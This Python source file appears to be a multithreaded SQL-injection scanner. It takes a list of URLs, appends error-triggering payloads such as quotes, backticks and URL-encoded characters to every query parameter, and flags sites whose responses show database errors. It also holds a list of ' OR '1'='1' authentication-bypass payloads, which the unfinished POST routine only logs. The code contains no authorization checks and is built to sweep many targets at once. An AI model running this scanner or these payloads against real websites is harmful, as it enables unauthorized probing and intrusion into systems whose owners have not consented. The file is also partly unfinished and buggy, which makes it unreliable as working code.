#!/usr/bin/python3
#1.0-beta

import logging
import queue
import time
import threading
import multiprocessing
import subprocess
import src.web.web as web
import src.sqlerrors as sqlerrors
import urllib.parse as parse
import re

__name__ = "python-scanner"
logger  = logging.getLogger(__name__)

def exec_post(url, proxy=None):
    payloads = ("' OR '1'='1' --", "' OR '1'='1' /*", "' OR '1'='1' #", "' OR '1'=1' %00", "' OR '1'='1' %16")
    for payload in payloads:
        logger.debug(payload)
    return url

def find_form(html, proxy=None):
    if html is not "":
        forms = re.findall("<form.*", str(html))
        for form in forms:
            pass
        return forms

def sqli(url, proxy=None):
    """check SQL injection vulnerability"""

    domain = parse.urlparse(url)  # domain with path without queries
    queries = domain.query.split("&")
     # no queries in url
    if not any(queries):
        #std.stdebug("No queries in URL %s." % (url), end="\n")
        #std.stdebug("", end="\n") # move cursor to new line
        logger.debug("No queries in URL %s to test SQLi. Will attempt to look for POST forms." %  (url) )
        
        html = web.gethtml(url, proxy=proxy)
        resForm = find_form(html, proxy=proxy)
        if resForm is not None:
            for form in resForm:
                logger.debug("Found %s ", str(form) )
            #return True, url
        else:
            logger.debug("No forms found....")
            #return False, url
    else:
        domain = domain.geturl().split("?")[0]
        logger.debug("Found queries in %s to test SQLi.",  domain)
        payloads = ("'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
        for payload in payloads:
            website = domain + "?" + ("&".join([param + payload for param in queries]))
            logger.info("Fetching content of URL %s with PAYLOAD: [%s]\n[%s]" %  (url ,payload, website) )
            source = web.gethtml(website, proxy=proxy)
            if source:
                vulnerable, db = sqlerrors.check(source)
                if vulnerable is True and db != None:
                    logger.info("Target URL is vulnerable")
                    return True, url, db
            else:
                logger.debug("Unable to fetch website source.")
    return False, url

def scan(urls,  threads=50, proxy=None):
    """scan multiple websites with multi processing"""
    vulnerables = [] 
    tested = []

    exitFlag = 0
    thread_list = []
    q   = queue.Queue()

    logger.info("Starting on [%d] urls with [%d] threads" % (len(urls), threads) )
    time.sleep(4)
    def worker():
    	while True:
	        url, proxy = q.get() # get queue item
	        if(url is None):
	        	break
	        logger.info("Starting worker on %s " % (url))
	        test = sqli(url, proxy)
	        if test[0]:
	            logger.info("vulnerable URL found  %s ", test[1] )
	            tested.append((test[1], test[2]))
	        logger.info("Thread finished.")
	        print(test)
	        q.task_done()


    for url in urls:
    	try:
    		domain = parse.urlparse(url)  # domain with path without queries
    		if domain.hostname is not None:
    			logger.debug(domain.hostname)
    			#sqli(url, proxy)
    			q.put((url, proxy))
    	except:
    		pass
    for i in range(threads):
        t = threading.Thread(target=worker)
        logger.info("Starting thread: %s ", t.name)
        t.daemon = True
        thread_list.append(t)
        t.start()
        
    logger.info("Waiting for threads to finish to join.")
    logger.info(thread_list)
    for thread in thread_list:
    	logger.info("Joining thread: %s" % (thread.name))
    	thread.join(1.0)
    q.join()
    exitFlag = 1
    logger.info("Done waiting for threads, all finished and returning %s results", len(tested))
    return tested

